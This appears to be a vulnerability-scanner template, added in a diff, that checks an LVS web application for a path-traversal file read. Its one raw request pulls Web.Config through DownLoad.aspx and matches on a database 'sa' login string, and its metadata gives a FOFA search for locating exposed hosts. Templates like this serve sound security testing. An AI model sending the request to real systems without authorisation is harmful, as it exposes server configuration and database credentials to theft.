@@ -1,0 +1,31 @@
+id: LVS-DownLoad-aspx-Fileread
+
+info:
+  name: LVS-DownLoad-aspx-Fileread
+  author: lengmo
+  severity: high
+  description: LVS-DownLoad-aspx-Fileread
+  tags: Fileread
+  metadata:
+    fofa-qeury: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /Business/DownLoad.aspx?p=UploadFile/../Web.Config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body,'USER ID=sa')" 
